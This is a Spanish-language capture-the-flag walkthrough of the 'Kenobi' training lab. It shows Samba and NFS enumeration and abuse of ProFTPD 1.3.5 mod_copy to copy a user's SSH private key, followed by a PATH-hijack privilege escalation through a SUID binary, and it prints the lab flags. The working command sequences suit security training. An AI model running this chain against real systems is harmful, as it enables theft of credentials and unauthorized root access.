#smb

Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 

## Task 1 Deploy the vulnerable machine

### Make sure you're connected to our network and deploy the machine
ok

### Scan the machine with nmap, how many ports are open?

```
nmap -sV -v 10.10.207.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 11:53 CDT
NSE: Loaded 46 scripts for scanning.
 
Completed Service scan at 11:54, 12.60s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.207.144.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.83s elapsed
Initiating NSE at 11:54
Completed NSE at 11:54, 0.81s elapsed
Nmap scan report for 10.10.207.144
Host is up (0.19s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.42 seconds
                                                                                          
```

## Task 2 Enumerating Samba for shares

Samba es el paquete estándar de programas de interoperabilidad de Windows para Linux y Unix. Permite a los usuarios finales acceder y utilizar archivos, impresoras y otros recursos compartidos en la intranet o internet de una empresa. Se le suele denominar sistema de archivos de red.

Samba se basa en el protocolo cliente-servidor común, el Bloque de Mensajes del Servidor ( SMB ). SMB está desarrollado exclusivamente para Windows; sin Samba, otras plataformas informáticas quedarían aisladas de las máquinas Windows, incluso si formaran parte de la misma red.

Usando nmap podemos enumerar una máquina para compartir SMB.

Nmap puede automatizar diversas tareas de red. ¡Incluye un script para enumerar recursos compartidos!

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.112.187

SMB tiene dos puertos, 445 y 139.

### Using the nmap command above, how many shares have been found?
3

#### Usar nmap para listar las shares

```
nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.207.144 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 11:58 CDT
Nmap scan report for 10.10.207.144
Host is up (0.19s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.207.144\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.207.144\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.207.144\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 28.81 seconds

```

### otra forma con `smbclient`
```
smbclient -L 10.10.207.144
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KENOBI

```


### Once you're connected, list the files on the share. What is the file can you see?


#### Conectarme a la carpeta compartida y listar archivos

```
smbclient //10.10.207.144/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 05:49:09 2019
  ..                                  D        0  Wed Sep  4 05:56:07 2019
  log.txt                             N    12237  Wed Sep  4 05:49:09 2019
get
                9204224 blocks of size 1024. 6877108 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (15.3 KiloBytes/sec) (average 15.3 KiloBytes/sec)
smb: \> exit

```

#### Puedo obtener los archivos también con `smbget`

- Podemos descargar recursivamente los archivos en la carpeta compartida

```
┌──(kali㉿kali)-[~/tmp/tryhackme/kenobi]
└─$ smbget --recursive smb://10.10.112.187/anonymous
Password for [WORKGROUP\kali]:
Using domain: WORKGROUP, user: kali
smb://10.10.112.187/anonymous/log.txt                                                                        
Downloaded 11.95kB in 4 seconds
                                                                                                             
┌──(kali㉿kali)-[~/tmp/tryhackme/kenobi]
└─$ ls
log.txt  nmap
                                                                                                
```

#### Mostramos la info en `log.txt`

Abra el archivo en el recurso compartido. Se encontraron algunas cosas interesantes.

- Información generada para Kenobi al generar una clave SSH para el usuario
- Información sobre el servidor ProFTPD.
- tenemos los datos de un usuario y contraseña

```
head -n60 log.txt

# Set the user and group under which the server will run.
User				kenobi
Group				kenobi
```


### What port is FTP running on?

21

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
```

El escaneo de puertos de nmap anterior mostró el puerto 111 ejecutando el servicio rpcbind. Este es un servidor que convierte el número de programa de llamada a procedimiento remoto (RPC) en direcciones universales. Al iniciar un servicio RPC, le indica a rpcbind la dirección en la que está escuchando y el número de programa RPC que está listo para servir. 

En nuestro caso, el puerto 111 da acceso a un sistema de archivos de red. Usemos nmap para enumerarlo.

### What mount can we see?
/var
#### Mostramos las carpetas compartidas con `nmap` scripts

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.249.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 09:09 CDT
Nmap scan report for 10.10.249.9
Host is up (0.18s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836544.0  6877084.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 4.30 seconds
```
#### Otra forma de mostrar  es con `showmount`

```
showmount -e 10.10.207.144
Export list for 10.10.207.144:
/var *
```


##  Task 3 Gain initial access with ProFtpd
 

### What is the version?
```
21/tcp   open  ftp         ProFTPD 1.3.5
```

Podemos utilizar searchsploit para encontrar exploits para una versión particular de software.

Searchsploit es básicamente una herramienta de búsqueda de línea de comandos para exploit-db.com.
### How many exploits are there for the ProFTPd running?
4

#### Buscamos los exploits con `searchsploit`
```
searchsploit ProFTPD 1.3.5
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploi | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution     | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                               | linux/remote/36742.txt
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Deberías haber encontrado un exploit del [módulo mod_copy](http://www.proftpd.org/docs/contrib/mod_copy.html) de ProFtpd . 

El módulo mod_copy implementa los comandos **SITE CPFR** y **SITE CPTO** , que permiten copiar archivos/directorios de un lugar a otro en el servidor. Cualquier cliente no autenticado puede usar estos comandos para copiar archivos desde cualquier  parte del sistema de archivos a un destino seleccionado.

#### Vemos la información del exploit `searchsploit -x`

```
searchsploit -x 36742.txt 

Trying 80.150.216.115...
Connected to 80.150.216.115.
Escape character is '^]'.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
site help
214-The following SITE commands are recognized (* =>'s unimplemented)

214-CPFR <sp> pathname
214-CPTO <sp> pathname

```

Sabemos que el servicio FTP se está ejecutando como el usuario Kenobi (desde el archivo en el recurso compartido) y se genera una clave ssh para ese usuario.

Ahora vamos a copiar  la clave privada de Kenobi usando los comandos SITE CPFR y SITE CPTO.

#### Copiar la llave privada, usando la info para explotar la vulnerabilidad

```
nc 10.10.207.144 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.207.144]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
^C

```

Sabíamos que el directorio /var era un montaje visible (tarea 2, pregunta 4). Por lo tanto, hemos movido la clave privada de Kenobi al directorio /var/tmp.

#### montamos la share y la copiamos

- creamos un directorio para el montaje y montamos, luego listamos para ver que se haya montado

```
sudo mkdir /mnt/kenobi

sudo mount 10.10.207.144:/var /mnt/kenobi

ls -la /mnt/kenobi/  
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Mar 20 12:29 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Mar 20 12:28 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www

```

### copiamos la lleve, cambiamos permisos y usamos
```
cp /mnt/kenobi/tmp/id_rsa .

sudo umount /mnt/kenobi

sudo chmod 600 id_rsa 

ssh -i id_rsa kenobi@10.10.207.144

The authenticity of host '10.10.207.144 (10.10.207.144)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:10: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? 

* Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 

kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 

```

###  Task 4 Privilege Escalation with Path Variable Manipulation

Primero entendamos qué son SUID, SGID y Sticky Bits.

|             |                                                                              |                                                                           |
| ----------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| **Permiso** | **En archivos**                                                              | **Sobre los directorios**                                                 |
| Bit SUID    | El usuario ejecuta el archivo con los permisos del propietario del _archivo_ | -                                                                         |
| Bit SGID    | El usuario ejecuta el archivo con el permiso del propietario _del grupo_ .   | El archivo creado en el directorio obtiene el mismo propietario de grupo. |
| Sticki Bit  | Sin significado                                                              | A los usuarios se les impide eliminar archivos de otros usuarios.         |
Los bits SUID pueden ser peligrosos, algunos binarios como passwd necesitan ejecutarse con privilegios elevados (ya que restablece su contraseña en el sistema), sin embargo, otros archivos personalizados que tengan el bit SUID pueden generar todo tipo de problemas.

Para buscar este tipo de archivos en un sistema, ejecute lo siguiente: 

find / -perm -u=s -type f 2>/dev/null

### What file looks particularly out of the ordinary? 

/usr/bin/menu

```
find / -perm -u=s -type f 2>/dev/null

or

find / -user root -perm /4000 2>/dev/nul


/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd

/usr/bin/menu

/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```



### Run the binary, how many options appear?

3
#### Ejecutamos el binario

- Al ejecutar el binario nos aparecen 3 opciones

```
/usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Wed, 20 Mar 2024 17:36:58 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

```

#### Comprobamos las opciones del menu

```
kenobi@kenobi:~$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Fri, 28 Mar 2025 17:22:36 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:87:9f:d2:14:9d  
          inet addr:10.10.112.187  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::87:9fff:fed2:149d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:3134 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3048 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:299414 (299.4 KB)  TX bytes:420952 (420.9 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:234 errors:0 dropped:0 overruns:0 frame:0
          TX packets:234 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:16741 (16.7 KB)  TX bytes:16741 (16.7 KB)

```

#### Hacemos un strings al binario para ver que encontramos

- Ejecuta los comandos curl, uname -r, ifconfig

```
strings -n 10 /usr/bin/menu 

/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig


```

Esto nos muestra que el binario se está ejecutando sin una ruta completa (por ejemplo, no utiliza /usr/bin/curl o /usr/bin/uname).

Como este archivo se ejecuta con privilegios de usuario root, podemos manipular nuestra ruta para obtener un shell root

#### Copiamos /bin/sh como curl en la carpeta temporal y modificamos la ruta

- Copiamos

```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```

- Modificamos la ruta
```
echo $PATH

/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

export PATH=/tmp:$PATH
echo $PATH

/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin


```

### What is the root flag (/root/root.txt)?


#### Ahora invocamos al menu para tener el root

```
kenobi@kenobi:/tmp$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cd /root
# ls -a
.  ..  .bash_history  .bashrc  .cache  .profile  root.txt  .viminfo
# cat root.txt  
177b3cd8562289f37382721c28381f02
# 
```
